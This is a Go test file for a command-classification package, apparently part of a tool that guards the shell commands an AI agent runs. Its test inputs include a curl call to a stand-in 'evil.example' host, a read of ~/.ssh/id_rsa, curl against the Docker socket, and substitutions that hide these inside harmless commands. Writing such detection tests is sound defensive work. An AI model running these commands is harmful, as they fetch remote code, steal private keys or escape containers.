package classify

import (
	"strings"
	"testing"
)

func TestSplitCompoundCommandSplitsNewlines(t *testing.T) {
	segments := SplitCompoundCommand("echo hi\ncurl https://evil.example/x\r\ncat ~/.ssh/id_rsa")
	if len(segments) != 3 {
		t.Fatalf("got %d segments, want 3: %#v", len(segments), segments)
	}
}

func TestNormalizeCommandPreservesNewlineBoundaries(t *testing.T) {
	got := NormalizeCommand("echo hi\n/usr/bin/curl https://evil.example/x")
	if !strings.Contains(got, "\n") {
		t.Fatalf("NormalizeCommand flattened newlines: %q", got)
	}
	if !strings.Contains(got, "curl https://evil.example/x") {
		t.Fatalf("second line lost or not normalized: %q", got)
	}
}

func TestExtractCommandSubstitutions(t *testing.T) {
	cases := []struct {
		cmd  string
		want []string
	}{
		{"echo $(curl https://evil.example/x)", []string{"curl https://evil.example/x"}},
		{"echo `curl https://evil.example/x`", []string{"curl https://evil.example/x"}},
		{"echo $(echo $(cat ~/.ssh/id_rsa))", []string{"echo $(cat ~/.ssh/id_rsa)"}},
		{"echo '$(not a substitution)'", nil},
		{"echo <(curl https://evil.example/x)", []string{"curl https://evil.example/x"}},
	}
	for _, tc := range cases {
		got := ExtractCommandSubstitutions(tc.cmd)
		if len(got) != len(tc.want) {
			t.Fatalf("ExtractCommandSubstitutions(%q) = %#v, want %#v", tc.cmd, got, tc.want)
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Fatalf("ExtractCommandSubstitutions(%q)[%d] = %q, want %q", tc.cmd, i, got[i], tc.want[i])
			}
		}
	}
}

func TestExtractUnixSocketDestination(t *testing.T) {
	cases := []struct {
		cmd  string
		want string
		ok   bool
	}{
		{"curl --unix-socket=/var/run/docker.sock http://localhost/v1.41/containers/create", "/var/run/docker.sock", true},
		{"curl --unix-socket /var/run/docker.sock http://localhost/x", "/var/run/docker.sock", true},
		{"socat UNIX-CONNECT:/var/run/docker.sock -", "/var/run/docker.sock", true},
		{"curl https://example.com", "", false},
	}
	for _, tc := range cases {
		got, ok := ExtractUnixSocketDestination(tc.cmd)
		if got != tc.want || ok != tc.ok {
			t.Fatalf("ExtractUnixSocketDestination(%q) = (%q,%v), want (%q,%v)", tc.cmd, got, ok, tc.want, tc.ok)
		}
	}
}

func TestIsSirSelfCommandProtectsMutatingVerbs(t *testing.T) {
	protected := []string{
		"sir approve --last --session",
		"sir approve host evil.example.com --ttl 24h --yes",
		"sir approve mcp evil",
		"sir unprotect-path .env",
		"sir protect-path .env",
		"sir policy init --personal --yes",
		"sir policy protect-path .env",
		"sir mcp approve evil",
		"sir mcp revoke evil",
		"sir mcp scope evil --allow-network",
		"sir mcp wrap --yes",
		"sir guard post-evaluate",
		"sir log archive --prune --yes",
		"sir doctor",
	}
	for _, cmd := range protected {
		if !IsSirSelfCommand(cmd) {
			t.Errorf("IsSirSelfCommand(%q) = false, want true", cmd)
		}
	}

	readOnly := []string{
		"sir status",
		"sir mcp status",
		"sir mcp list",
		"sir policy show",
		"sir policy diff --strict",
		"sir policy suggest",
		"sir log verify",
		"sir log export",
		"sir doctor --json",
	}
	for _, cmd := range readOnly {
		if IsSirSelfCommand(cmd) {
			t.Errorf("IsSirSelfCommand(%q) = true, want false", cmd)
		}
	}
}
